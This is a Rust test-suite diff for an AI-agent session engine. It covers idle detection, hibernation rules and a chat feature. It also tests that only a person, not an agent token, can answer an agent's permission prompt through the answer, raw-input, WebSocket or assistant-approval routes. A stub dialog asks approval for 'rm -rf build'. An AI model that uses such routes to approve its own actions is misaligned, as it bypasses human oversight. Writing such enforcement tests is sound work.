@@ -82,6 +82,7 @@ fn test_config() -> Config {
         agent_onboarding: vogt_engine_server::claude_config::Onboarding::default(),
         session_rss_warn_bytes: None,
         metrics_bind: None,
+        chat: Default::default(),
     }
 }
 
@@ -217,7 +218,9 @@ async fn stand_in_core_knowing(
                     StatusCode::OK,
                     axum::Json(json!({
                         "identity_ref": identity_ref,
-                        "kind": "human",
+                        // What the real core says of these: an `agent:`
+                        // actor is an agent, anyone else a person.
+                        "kind": if identity_ref.starts_with("agent:") { "agent" } else { "human" },
                         "display_name": identity_ref,
                         "scopes": scopes,
                     })),
@@ -1898,6 +1901,119 @@ async fn session_activity_becomes_idle_after_quiet_window() {
         .delete(format!("{base}/api/sessions/{id}"))
         .send()
         .await;
+}
+
+/// WI-1090: Klaudia's idle input box repaints its blinking cursor faster
+/// than the quiet window, forever. Output that leaves the screen as it was
+/// is not activity, so the session settles to `idle` and its screen reads
+/// `ready`, while a TUI whose repaints do change the screen (a spinner)
+/// stays `running`.
+#[tokio::test]
+async fn an_identical_repaint_is_not_activity_but_a_spinner_is() {
+    let (base, _h) = boot().await;
+    let client = reqwest::Client::builder()
+        .default_headers(auth())
+        .build()
+        .unwrap();
+    let dir = tempfile::tempdir().unwrap();
+    // Named `klaudia`, so the engine reads its screen by Klaudia's rules.
+    let fake = |name: &str, body: &str| {
+        let sub = dir.path().join(name);
+        std::fs::create_dir_all(&sub).unwrap();
+        let path = sub.join("klaudia");
+        std::fs::write(&path, format!("#!/bin/sh\n{body}\n")).unwrap();
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
+        path.to_string_lossy().into_owned()
+    };
+    // The idle frame: a footer, the input box, the status bar.
+    let frame = r"printf '\033[2J\033[H  done in 9m07s\r\n\342\225\255\342\224\200\342\224\200\342\225\256\r\n\342\224\202 \342\200\272 Ask Klaudia\342\200\246 \342\224\202\r\n\342\225\260\342\224\200\342\224\200\342\225\257\r\n  grok-4.7 \302\267 3 turns\r'";
+    // Then the blink: the cursor cell flips between reverse video and dim
+    // every 80 ms, under the suite's 200 ms quiet window.
+    let idle = fake(
+        "idle",
+        &format!(
+            "{frame}\nn=0\nwhile :; do n=$((n+1)); if [ $((n%2)) = 0 ]; then a='\\033[7m'; else a='\\033[2m'; fi\n\
+             printf \"\\033[3;1H\\342\\224\\202 \\342\\200\\272 ${{a}}A\\033[0msk Klaudia\\342\\200\\246 \\342\\224\\202\\033[K\\033[5;1H\"; sleep 0.08; done"
+        ),
+    );
+    let spinning = fake(
+        "spinning",
+        &format!(
+            "{frame}\nn=0\nwhile :; do n=$((n+1)); printf \"\\033[1;1H  thinking $n (esc to interrupt)\\033[K\\033[5;1H\"; sleep 0.08; done"
+        ),
+    );
+
+    let start = |command: String| {
+        let client = client.clone();
+        let base = base.clone();
+        async move {
+            let created: Value = client
+                .post(format!("{base}/api/sessions"))
+                .json(&json!({ "name": "klaudia-repaint", "command": [command] }))
+                .send()
+                .await
+                .unwrap()
+                .json()
+                .await
+                .unwrap();
+            created["id"].as_str().unwrap().to_string()
+        }
+    };
+    let idle_id = start(idle).await;
+    let spinning_id = start(spinning).await;
+
+    let screen = |id: String| {
+        let client = client.clone();
+        let base = base.clone();
+        async move {
+            client
+                .get(format!("{base}/api/sessions/{id}/screen"))
+                .send()
+                .await
+                .unwrap()
+                .json::<Value>()
+                .await
+                .unwrap()
+        }
+    };
+    let deadline = std::time::Instant::now() + Duration::from_secs(10);
+    let settled = loop {
+        let view = screen(idle_id.clone()).await;
+        if view["activity"] == "idle" && view["ready"] == true {
+            break view;
+        }
+        assert!(
+            std::time::Instant::now() < deadline,
+            "a repainting idle Klaudia never settled: {view}"
+        );
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    };
+    assert!(
+        settled["lines"][2]
+            .as_str()
+            .unwrap()
+            .contains("Ask Klaudia"),
+        "{settled}"
+    );
+    // It is still repainting: its output clock keeps moving while it reads idle.
+    let before = settled["last_output_at"].clone();
+    tokio::time::sleep(Duration::from_millis(400)).await;
+    let later = screen(idle_id.clone()).await;
+    assert_ne!(later["last_output_at"], before, "{later}");
+    assert_eq!(later["activity"], "idle", "{later}");
+    assert_eq!(later["ready"], true, "{later}");
+
+    let spinner = screen(spinning_id.clone()).await;
+    assert_eq!(spinner["activity"], "running", "{spinner}");
+    assert_eq!(spinner["ready"], false, "{spinner}");
+
+    for id in [idle_id, spinning_id] {
+        let _ = client
+            .delete(format!("{base}/api/sessions/{id}"))
+            .send()
+            .await;
+    }
 }
 
 #[tokio::test]
@@ -9167,6 +9283,10 @@ async fn the_idle_policy_hibernates_only_what_no_exemption_covers() {
     let tooling = "#!/bin/sh\nsh -c 'sleep 300' &\nprintf 'helper=[%s]\\n> ' \"$!\"\nwait\n";
     // A turn that keeps printing.
     let busy = "#!/bin/sh\nprintf 'helper=[0]\\n'\nwhile :; do printf .; sleep 0.02; done\n";
+    // A turn whose only sign of life is a colour-cycled prompt (WI-1090):
+    // the screen's text never changes, so activity reads idle, but its bytes
+    // keep coming and a live turn must not be hibernated on that misreading.
+    let shimmer = "#!/bin/sh\nprintf 'helper=[0]\\n> '\nwhile :; do printf '\\r\\033[7m>\\033[0m '; sleep 0.02; printf '\\r\\033[2m>\\033[0m '; sleep 0.02; done\n";
     let ids = start_stub_agents(
         &client,
         &base,
@@ -9177,10 +9297,12 @@ async fn the_idle_policy_hibernates_only_what_no_exemption_covers() {
             ("blocked", quiet),
             ("tooling", tooling),
             ("busy", busy),
+            ("shimmer", shimmer),
         ],
     )
     .await;
-    let [quiet_id, pinned, blocked, tooling_id, busy_id] = [0, 1, 2, 3, 4].map(|i| ids[i].clone());
+    let [quiet_id, pinned, blocked, tooling_id, busy_id, shimmer_id] =
+        [0, 1, 2, 3, 4, 5].map(|i| ids[i].clone());
     let ok = client
         .post(format!("{base}/api/sessions/{pinned}/keep-awake"))
         .json(&json!({ "keep_awake": true }))
@@ -9215,6 +9337,7 @@ async fn the_idle_policy_hibernates_only_what_no_exemption_covers() {
             && why(&blocked).as_deref() == Some("blocked on a person")
             && why(&tooling_id).is_some_and(|w| w.contains("shell is running below the agent"))
             && why(&busy_id).as_deref() == Some("a turn is running")
+            && why(&shimmer_id).as_deref() == Some("output is still arriving")
     };
     let deadline = std::time::Instant::now() + Duration::from_secs(10);
     while !settled() && std::time::Instant::now() < deadline {
@@ -9229,6 +9352,15 @@ async fn the_idle_policy_hibernates_only_what_no_exemption_covers() {
         why(&tooling_id)
     );
     assert_eq!(why(&busy_id).as_deref(), Some("a turn is running"));
+    let shimmering = state.sessions.get(shimmer_id.parse().unwrap()).unwrap();
+    assert_eq!(
+        shimmering.activity(),
+        vogt_engine_contract::ActivityState::Idle
+    );
+    assert_eq!(
+        why(&shimmer_id).as_deref(),
+        Some("output is still arriving")
+    );
 
     run_once(
         &state.sessions,
@@ -9260,7 +9392,7 @@ async fn the_idle_policy_hibernates_only_what_no_exemption_covers() {
         .find(|s| s["id"] == quiet_id.as_str())
         .unwrap();
     assert_eq!(row["hibernation"]["trigger"], "idle");
-    for id in [&pinned, &blocked, &tooling_id, &busy_id] {
+    for id in [&pinned, &blocked, &tooling_id, &busy_id, &shimmer_id] {
         assert_ne!(activity(id), "hibernated", "{id} should have been exempt");
     }
 }
@@ -11506,4 +11638,1199 @@ async fn removing_oversight_lifts_its_pin_but_keeps_a_workers_own_pin() {
 
     kill_session(&client, &base, &overseer).await;
     kill_session(&client, &base, &pinned).await;
+}
+
+// ---------------------------------------------------------------------------
+// Only a person answers a permission prompt (WI-983)
+// ---------------------------------------------------------------------------
+
+/// A stand-in agent CLI showing one dialog: `question` over a numbered menu.
+/// It prints `typed <bytes>` for anything that is not an arrow or Enter, and
+/// `chose N` and exits on Enter, so a test can tell whether input reached it.
+fn dialog_script(dir: &std::path::Path, name: &str, question: &str) -> std::path::PathBuf {
+    let path = dir.join(name);
+    std::fs::write(
+        &path,
+        format!(
+            r#"import os, sys, tty
+opts = ["Yes", "No"]
+sel = 0
+def draw():
+    sys.stdout.write("\x1b[2J\x1b[H")
+    sys.stdout.write("Bash command\r\n\r\n  rm -rf build\r\n\r\n{question}\r\n")
+    for i, o in enumerate(opts):
+        sys.stdout.write(("❯ " if i == sel else "  ") + f"{{i+1}}. {{o}}\r\n")
+    sys.stdout.flush()
+fd = sys.stdin.fileno()
+tty.setraw(fd)
+draw()
+buf = b""
+while True:
+    buf += os.read(fd, 16)
+    while buf:
+        if buf.startswith(b"\x1b[B"):
+            sel = min(sel + 1, len(opts) - 1); buf = buf[3:]; draw()
+        elif buf.startswith(b"\x1b[A"):
+            sel = max(sel - 1, 0); buf = buf[3:]; draw()
+        elif buf.startswith(b"\r"):
+            sys.stdout.write("\x1b[2J\x1b[H" + f"chose {{sel+1}}\r\n> ")
+            sys.stdout.flush()
+            os.read(fd, 1)
+            sys.exit(0)
+        elif buf.startswith(b"\x1b") and len(buf) < 3:
+            break
+        else:
+            sys.stdout.write("\x1b[20;1Htyped " + repr(buf[:1]))
+            sys.stdout.flush()
+            buf = buf[1:]
+"#
+        ),
+    )
+    .unwrap();
+    path
+}
+
+/// Start `script` as a session and wait until it reads as awaiting approval;
+/// the dialog it shows, as the screen reports it.
+async fn session_showing_dialog(
+    client: &reqwest::Client,
+    base: &str,
+    name: &str,
+    script: &std::path::Path,
+) -> (String, Value) {
+    let created: Value = client
+        .post(format!("{base}/api/sessions"))
+        .json(&json!({ "name": name, "command": ["python3", script.to_string_lossy()] }))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let id = created["id"].as_str().unwrap().to_string();
+    let deadline = tokio::time::Instant::now() + Duration::from_secs(15);
+    loop {
+        let screen: Value = client
+            .get(format!("{base}/api/sessions/{id}/screen"))
+            .send()
+            .await
+            .unwrap()
+            .json()
+            .await
+            .unwrap();
+        if screen["activity"] == "awaiting-approval" {
+            return (id, screen["approval"].clone());
+        }
+        assert!(
+            tokio::time::Instant::now() < deadline,
+            "never awaiting-approval: {screen}"
+        );
+        tokio::time::sleep(Duration::from_millis(100)).await;
+    }
+}
+
+async fn wi983_front_door() -> (String, tempfile::TempDir, ServerGuard) {
+    let core = stand_in_core_knowing(vec![
+        (
+            WI983_SESSION,
+            "agent:session:ses_overseer",
+            vec!["work.write"],
+        ),
+        (WI983_ENGINE, "agent:engine:3f2a", vec!["work.write"]),
+        (WI983_POD, "agent:pod:vogt-dev", vec!["work.write"]),
+        // An agent token holding `admin` is still an agent.
+        (WI983_AGENT_ADMIN, "agent:vogt-sessions", vec!["admin"]),
+        (WI983_PERSON, "human:ada", vec!["work.write"]),
+    ])
+    .await;
+    let tmp = tempfile::tempdir().unwrap();
+    let mut cfg = test_config();
+    cfg.vogt_core_url = Some(core);
+    cfg.vogt_core_token = Some(WI983_STACK.into());
+    let (base, guard) = boot_with_config(cfg).await;
+    (base, tmp, guard)
+}
+
+const WI983_STACK: &str = "stack-secret-for-wi983-1234567890";
+const WI983_SESSION: &str = "session-token-wi983-1234567890";
+const WI983_ENGINE: &str = "engine-token-wi983-1234567890";
+const WI983_POD: &str = "pod-token-wi983-1234567890abcd";
+const WI983_AGENT_ADMIN: &str = "agent-admin-wi983-1234567890";
+const WI983_PERSON: &str = "person-token-wi983-1234567890";
+
+fn client_for(token: &str) -> reqwest::Client {
+    reqwest::Client::builder()
+        .default_headers(auth_for(token))
+        .build()
+        .unwrap()
+}
+
+/// WI-983: a permission prompt is answered by a person and nobody else. A
+/// session token, an engine-minted token, the pod token — even one holding
+/// `admin` — and vogt-core's own credential without a person behind it are
+/// refused on every route that reaches the terminal: `/answer`, raw
+/// `/input`, and a WebSocket keystroke. Nothing they send is typed. A person
+/// answers it; so does vogt-core relaying a person.
+#[tokio::test]
+async fn only_a_person_answers_a_permission_prompt() {
+    let (base, tmp, _guard) = wi983_front_door().await;
+    let operator = client_for(TEST_TOKEN);
+    let script = dialog_script(tmp.path(), "ask.py", "Do you want to proceed?");
+    let (id, approval) = session_showing_dialog(&operator, &base, "asking", &script).await;
+    assert_eq!(approval["kind"], "permission", "{approval}");
+
+    for token in [WI983_SESSION, WI983_ENGINE, WI983_POD, WI983_AGENT_ADMIN] {
+        let agent = client_for(token);
+        let answered = agent
+            .post(format!("{base}/api/sessions/{id}/answer"))
+            .json(&json!({ "option": 1, "person": true }))
+            .send()
+            .await
+            .unwrap();
+        assert_eq!(answered.status(), StatusCode::FORBIDDEN, "{token}");
+        let said: Value = answered.json().await.unwrap();
+        let said = said["error"].as_str().unwrap();
+        assert!(said.contains("person required"), "{said}");
+        assert!(said.contains("session_report_blocked"), "{said}");
+
+        // Raw input is the same answer by other means: a TUI dialog is
+        // modal, so "1", Enter or Esc all land on it.
+        for text in ["1", "\r", "\x1b"] {
+            let typed = agent
+                .post(format!("{base}/api/sessions/{id}/input"))
+                .json(&json!({ "text": text, "submit": false, "person": true }))
+                .send()
+                .await
+                .unwrap();
+            assert_eq!(typed.status(), StatusCode::FORBIDDEN, "{token} {text:?}");
+        }
+    }
+
+    // vogt-core's own credential relays for a principal; without saying a
+    // person is behind it, it is refused like an agent.
+    let core = client_for(WI983_STACK);
+    for body in [
+        json!({ "option": 1 }),
+        json!({ "option": 1, "person": false }),
+    ] {
+        let answered = core
+            .post(format!("{base}/api/sessions/{id}/answer"))
+            .json(&body)
+            .send()
+            .await
+            .unwrap();
+        assert_eq!(answered.status(), StatusCode::FORBIDDEN, "{body}");
+    }
+    let typed = core
+        .post(format!("{base}/api/sessions/{id}/input"))
+        .json(&json!({ "text": "1", "submit": true }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(typed.status(), StatusCode::FORBIDDEN);
+    // The break-glass operator, told by the core that an agent is behind
+    // it, is refused too.
+    let relayed = operator
+        .post(format!("{base}/api/sessions/{id}/input"))
+        .json(&json!({ "text": "1", "submit": true, "person": false }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(relayed.status(), StatusCode::FORBIDDEN);
+
+    // A WebSocket attach by an agent: the keystroke is dropped and the
+    // socket told why, in band.
+    let mut ws = ws_attach_with_token(&base, &id, WI983_SESSION).await;
+    let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
+    loop {
+        let msg = tokio::time::timeout(Duration::from_secs(5), ws.next())
+            .await
+            .unwrap()
+            .unwrap()
+            .unwrap();
+        if let Message::Text(t) = &msg {
+            if t.contains("snapshot-done") {
+                break;
+            }
+        }
+        assert!(tokio::time::Instant::now() < deadline);
+    }
+    ws.send(Message::Binary(b"1\r".to_vec().into()))
+        .await
+        .unwrap();
+    let refused = loop {
+        let msg = tokio::time::timeout(Duration::from_secs(5), ws.next())
+            .await
+            .expect("an input-refused frame")
+            .unwrap()
+            .unwrap();
+        if let Message::Text(t) = &msg {
+            let frame: Value = serde_json::from_str(t).unwrap();
+            if frame["type"] == "input-refused" {
+                break frame;
+            }
+        }
+    };
+    assert!(
+        refused["reason"]
+            .as_str()
+            .unwrap()
+            .contains("person required"),
+        "{refused}"
+    );
+
+    // Nothing any of them sent reached the dialog.
+    tokio::time::sleep(Duration::from_millis(300)).await;
+    let screen: Value = operator
+        .get(format!("{base}/api/sessions/{id}/screen"))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(screen["activity"], "awaiting-approval", "{screen}");
+    let shown = screen["lines"].to_string();
+    assert!(!shown.contains("typed"), "{shown}");
+    assert!(!shown.contains("chose"), "{shown}");
+
+    // A person answers it.
+    let answered: Value = client_for(WI983_PERSON)
+        .post(format!("{base}/api/sessions/{id}/answer"))
+        .json(&json!({ "option": 2, "expect_question": "Do you want to proceed?" }))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(answered["chosen"]["number"], 2, "{answered}");
+    assert_eq!(answered["kind"], "permission");
+    live_output_containing(&operator, &base, &id, &["chose 2"]).await;
+
+    // vogt-core relaying a person answers it as well — what the core's own
+    // `session.answer` sends after deciding its principal is a person.
+    let (relayed, _) = session_showing_dialog(&operator, &base, "relayed", &script).await;
+    let answered = core
+        .post(format!("{base}/api/sessions/{relayed}/answer"))
+        .json(&json!({ "option": 1, "person": true }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(answered.status(), StatusCode::OK);
+    live_output_containing(&operator, &base, &relayed, &["chose 1"]).await;
+}
+
+/// WI-983 stops at permission prompts. An overseer still drives: it types
+/// into a session with no dialog showing, by REST and over a WebSocket, and
+/// it answers a startup gate (folder trust), which is not a permission
+/// prompt.
+#[tokio::test]
+async fn an_overseer_still_drives_a_session_that_is_not_asking_permission() {
+    let (base, tmp, _guard) = wi983_front_door().await;
+    let operator = client_for(TEST_TOKEN);
+    let overseer = client_for(WI983_SESSION);
+
+    // Ordinary input to a shell.
+    let shell: Value = operator
+        .post(format!("{base}/api/sessions"))
+        .json(&json!({ "name": "worker", "command": ["/bin/sh"] }))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let shell = shell["id"].as_str().unwrap().to_string();
+    let typed = overseer
+        .post(format!("{base}/api/sessions/{shell}/input"))
+        .json(&json!({ "text": "echo driven-$((40+2))", "submit": true }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(typed.status(), StatusCode::OK);
+    live_output_containing(&operator, &base, &shell, &["driven-42"]).await;
+    let mut ws = ws_attach_with_token(&base, &shell, WI983_SESSION).await;
+    ws.send(Message::Binary(b"echo attached-$((6*7))\r".to_vec().into()))
+        .await
+        .unwrap();
+    live_output_containing(&operator, &base, &shell, &["attached-42"]).await;
+
+    // A folder-trust gate is a startup gate, not a permission prompt.
+    let gate = dialog_script(
+        tmp.path(),
+        "trust.py",
+        "Quick safety check: Is this a project you created or one you trust?",
+    );
+    let (gated, approval) = session_showing_dialog(&operator, &base, "gated", &gate).await;
+    assert_eq!(approval["kind"], "folder-trust", "{approval}");
+    let answered = overseer
+        .post(format!("{base}/api/sessions/{gated}/answer"))
+        .json(&json!({ "option": 1 }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(answered.status(), StatusCode::OK);
+    live_output_containing(&operator, &base, &gated, &["chose 1"]).await;
+}
+
+/// What the stand-in chat provider will answer, in order, and every
+/// request body it was sent.
+#[derive(Default)]
+struct ChatStub {
+    replies: Vec<Value>,
+    requests: Vec<Value>,
+}
+
+type ChatScript = Arc<Mutex<ChatStub>>;
+
+/// A stand-in chat provider that answers `/chat/completions` with each
+/// message pushed onto the returned script in turn (a `choices[0].message`),
+/// then a plain "done".
+async fn stand_in_chat() -> (String, ChatScript) {
+    use axum::{extract::State, routing::post, Router};
+    async fn chat(
+        State(script): State<ChatScript>,
+        axum::Json(body): axum::Json<Value>,
+    ) -> axum::Json<Value> {
+        let message = {
+            let mut script = script.lock().unwrap();
+            script.requests.push(body);
+            if script.replies.is_empty() {
+                json!({"role": "assistant", "content": "done"})
+            } else {
+                script.replies.remove(0)
+            }
+        };
+        axum::Json(json!({"choices": [{"message": message}]}))
+    }
+    let script: ChatScript = Arc::default();
+    let app = Router::new()
+        .route("/chat/completions", post(chat))
+        .with_state(Arc::clone(&script));
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
+    (format!("http://{addr}"), script)
+}
+
+/// Ask the assistant, as `client`, to type "1" and Enter into `session`,
+/// then approve the card it proposes. Returns the approval's response.
+async fn approve_typing_one(
+    client: &reqwest::Client,
+    base: &str,
+    script: &ChatScript,
+    session: &str,
+) -> reqwest::Response {
+    script.lock().unwrap().replies.extend([
+        json!({"role": "assistant", "content": null, "tool_calls": [{
+            "id": "call_1",
+            "type": "function",
+            "function": {
+                "name": "send_input",
+                "arguments": json!({"session_id": session, "text": "1", "submit": true})
+                    .to_string(),
+            },
+        }]}),
+        json!({"role": "assistant", "content": "turn over"}),
+    ]);
+    let proposed = client
+        .post(format!("{base}/api/assistant/message"))
+        .json(&json!({ "text": "type 1 and Enter into the asking session" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(proposed.status(), StatusCode::OK);
+    let proposed: Value = proposed.json().await.unwrap();
+    let card = &proposed["pending_action"];
+    assert_eq!(card["kind"], "send_input", "{proposed}");
+    let card = card["id"].as_str().unwrap();
+    client
+        .post(format!("{base}/api/assistant/actions/{card}"))
+        .json(&json!({ "approve": true }))
+        .send()
+        .await
+        .unwrap()
+}
+
+/// The assistant's `send_input` card types as whoever approves it, so an
+/// agent driving the assistant with its own token cannot approve its way
+/// past a permission prompt; a person's approval is typed.
+#[tokio::test]
+async fn an_agent_cannot_approve_an_assistant_card_onto_a_permission_prompt() {
+    let core = stand_in_core_knowing(vec![
+        (
+            WI983_SESSION,
+            "agent:session:ses_overseer",
+            vec!["work.write"],
+        ),
+        (WI983_PERSON, "human:ada", vec!["work.write"]),
+    ])
+    .await;
+    let (chat, script) = stand_in_chat().await;
+    let tmp = tempfile::tempdir().unwrap();
+    let mut cfg = test_config();
+    cfg.vogt_core_url = Some(core);
+    cfg.vogt_core_token = Some(WI983_STACK.into());
+    cfg.assistant_api_key = Some("sk-test".into());
+    cfg.assistant_base_url = chat;
+    let (base, _guard) = boot_with_config(cfg).await;
+    let operator = client_for(TEST_TOKEN);
+    let dialog = dialog_script(tmp.path(), "ask.py", "Do you want to proceed?");
+    let (id, approval) = session_showing_dialog(&operator, &base, "asking", &dialog).await;
+    assert_eq!(approval["kind"], "permission", "{approval}");
+
+    // The agent's approval is refused at delivery: the model is told so and
+    // nothing reaches the terminal.
+    let agent = client_for(WI983_SESSION);
+    let approved = approve_typing_one(&agent, &base, &script, &id).await;
+    assert_eq!(approved.status(), StatusCode::OK);
+    let told = script.lock().unwrap().requests.last().unwrap().to_string();
+    assert!(
+        told.contains("person required"),
+        "the refusal is what the model saw: {told}"
+    );
+    tokio::time::sleep(Duration::from_millis(500)).await;
+    let screen: Value = operator
+        .get(format!("{base}/api/sessions/{id}/screen"))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(screen["activity"], "awaiting-approval", "{screen}");
+    let shown = screen.to_string();
+    assert!(
+        !shown.contains("typed") && !shown.contains("chose"),
+        "nothing was typed: {screen}"
+    );
+
+    // A person's approval of the same card is typed.
+    let person = client_for(WI983_PERSON);
+    let approved = approve_typing_one(&person, &base, &script, &id).await;
+    assert_eq!(approved.status(), StatusCode::OK);
+    live_output_containing(&operator, &base, &id, &["chose 1"]).await;
+}
+
+// ── Quick chats (WI-1097) ────────────────────────────────────────────────
+
+/// A test engine whose chats are driven by the scripted stand-in
+/// (`tests/fixtures/fake-klaudia.py`), reached through a symlink named
+/// `klaudia` so the engine recognises the driver. `None` without python3.
+type ChatEngine = (
+    String,
+    reqwest::Client,
+    Arc<AppState>,
+    ServerGuard,
+    tempfile::TempDir,
+);
+
+async fn boot_chats() -> Option<ChatEngine> {
+    boot_chats_with(|_| {}).await
+}
+
+async fn boot_chats_with(
+    tune: impl FnOnce(&mut vogt_engine_server::chats::ChatPolicy),
+) -> Option<ChatEngine> {
+    if std::process::Command::new("python3")
+        .arg("--version")
+        .output()
+        .is_err()
+    {
+        eprintln!("skipping: the stand-in driver is written in python3");
+        return None;
+    }
+    let bin = tempfile::tempdir().unwrap();
+    let fixture = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join("tests/fixtures/fake-klaudia.py")
+        .canonicalize()
+        .unwrap();
+    let driver = bin.path().join("klaudia");
+    std::os::unix::fs::symlink(&fixture, &driver).unwrap();
+    let mut cfg = Config {
+        chat: vogt_engine_server::chats::ChatPolicy {
+            enabled: true,
+            command: Some(vec![driver.to_string_lossy().into_owned()]),
+            models: vec![
+                vogt_engine_contract::ChatModel {
+                    id: "grok-4.7".into(),
+                    label: "Grok 4.7".into(),
+                },
+                vogt_engine_contract::ChatModel {
+                    id: "deepseek-v4-pro".into(),
+                    label: "DeepSeek V4 Pro".into(),
+                },
+            ],
+            approval_timeout: Duration::from_secs(10),
+            ..Default::default()
+        },
+        session_templates: vec![],
+        ..test_config()
+    };
+    tune(&mut cfg.chat);
+    let (base, state, guard) = boot_with_state(cfg).await;
+    state
+        .chats
+        .as_ref()
+        .expect("chats are configured")
+        .set_gate_base(base.clone());
+    let client = reqwest::Client::builder()
+        .default_headers(auth())
+        .build()
+        .unwrap();
+    Some((base, client, state, guard, bin))
+}
+
+async fn chat_send(client: &reqwest::Client, base: &str, id: &str, text: &str) -> Value {
+    let sent = client
+        .post(format!("{base}/api/chats/{id}/messages"))
+        .json(&json!({ "text": text, "wait_secs": 20 }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(
+        sent.status(),
+        StatusCode::OK,
+        "{}",
+        sent.text().await.unwrap()
+    );
+    sent.json().await.unwrap()
+}
+
+/// Wait until the chat shows a pending approval, and return it.
+async fn pending_approval(client: &reqwest::Client, base: &str, id: &str) -> Value {
+    tokio::time::timeout(Duration::from_secs(15), async {
+        loop {
+            let chat: Value = client
+                .get(format!("{base}/api/chats/{id}"))
+                .send()
+                .await
+                .unwrap()
+                .json()
+                .await
+                .unwrap();
+            if let Some(first) = chat["approvals"].as_array().and_then(|a| a.first()) {
+                break first.clone();
+            }
+            tokio::time::sleep(Duration::from_millis(50)).await;
+        }
+    })
+    .await
+    .expect("an approval should be raised")
+}
+
+fn texts(entries: &Value, kind: &str) -> Vec<String> {
+    entries
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|e| e["kind"] == kind)
+        .map(|e| e["text"].as_str().unwrap_or("").to_string())
+        .collect()
+}
+
+#[tokio::test]
+async fn a_chat_answers_switches_model_and_resumes_after_its_process_stops() {
+    let Some((base, client, state, _guard, _bin)) = boot_chats().await else {
+        return;
+    };
+    // Advertised, with the configured models.
+    let config: Value = reqwest::get(format!("{base}/api/config"))
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(config["chat"]["drivers"][0]["name"], "klaudia", "{config}");
+    assert_eq!(
+        config["chat"]["drivers"][0]["models"][1]["id"],
+        "deepseek-v4-pro"
+    );
+
+    let created: Value = client
+        .post(format!("{base}/api/chats"))
+        .json(&json!({ "work_item": "WI-1097" }))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    let id = created["chat"]["id"].as_str().unwrap().to_string();
+    assert_eq!(
+        created["chat"]["model"], "grok-4.7",
+        "the first model is the default"
+    );
+    assert_eq!(created["chat"]["creator"], "primary");
+
+    let first = chat_send(&client, &base, &id, "is bedrock in sydney?").await;
+    assert_eq!(first["finished"], true, "{first}");
+    assert_eq!(
+        texts(&first["entries"], "assistant"),
+        ["grok-4.7: is bedrock in sydney?"]
+    );
+    assert_eq!(first["chat"]["title"], "is bedrock in sydney?");
+
+    // Mid-chat switch: the live process is told, and says so on its next turn.
+    let switched = client
+        .post(format!("{base}/api/chats/{id}/model"))
+        .json(&json!({ "model": "deepseek-v4-pro" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(switched.status(), StatusCode::OK);
+    let second = chat_send(&client, &base, &id, "and now?").await;
+    assert_eq!(
+        texts(&second["entries"], "assistant"),
+        ["deepseek-v4-pro: and now?"]
+    );
+    let refused = client
+        .post(format!("{base}/api/chats/{id}/model"))
+        .json(&json!({ "model": "gpt-unknown" }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(refused.status(), StatusCode::BAD_REQUEST);
+
+    // The process stops (an idle exit, a restart); the next message resumes
+    // the same conversation by the chat's id, on the chosen model.
+    let runtime = state.chats.clone().unwrap();
+    let dir = state.config.state_dir.join("chats").join(&id);
+    runtime_stop(&runtime, &id).await;
+    let third = chat_send(&client, &base, &id, "still there?").await;
+    assert_eq!(
+        texts(&third["entries"], "assistant"),
+        ["deepseek-v4-pro: still there?"]
+    );
+    let launches: Vec<Vec<String>> = std::fs::read_to_string(dir.join("launches.jsonl"))
+        .unwrap()
+        .lines()
+        .map(|l| serde_json::from_str(l).unwrap())
+        .collect();
+    assert_eq!(launches.len(), 2, "{launches:?}");
+    let has = |argv: &[String], pair: [&str; 2]| {
+        argv.windows(2).any(|w| w[0] == pair[0] && w[1] == pair[1])
+    };
+    assert!(has(&launches[0], ["--session-id", &id]), "{launches:?}");
+    assert!(has(&launches[1], ["--resume", &id]), "{launches:?}");
+    assert!(
+        has(&launches[1], ["--model", "deepseek-v4-pro"]),
+        "{launches:?}"
+    );
+    assert!(launches[0].contains(&"--trusted-project-config".to_string()));
+    // The gate is the chat's own config, regenerated at launch.
+    assert!(std::fs::read_to_string(dir.join(".klaudia/config.toml"))
+        .unwrap()
+        .contains("PreToolUse"));
+
+    // Kept and found: listed, searchable by what was said, archivable.
+    let found: Value = client
+        .get(format!("{base}/api/chats?q=bedrock"))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(found.as_array().unwrap().len(), 1, "{found}");
+    assert_eq!(found[0]["message_count"], 6);
+    client
+        .post(format!("{base}/api/chats/{id}/archive"))
+        .json(&json!({ "archived": true }))
+        .send()
+        .await
+        .unwrap();
+    let open: Value = client
+        .get(format!("{base}/api/chats"))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert!(open.as_array().unwrap().is_empty(), "{open}");
+    let all: Value = client
+        .get(format!("{base}/api/chats?archived=all"))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
+    assert_eq!(all.as_array().unwrap().len(), 1);
+}
+
+async fn runtime_stop(runtime: &Arc<vogt_engine_server::chats::ChatRuntime>, id: &str) {
+    runtime
+        .stop_for_test(uuid::Uuid::parse_str(id).unwrap())
+        .await;
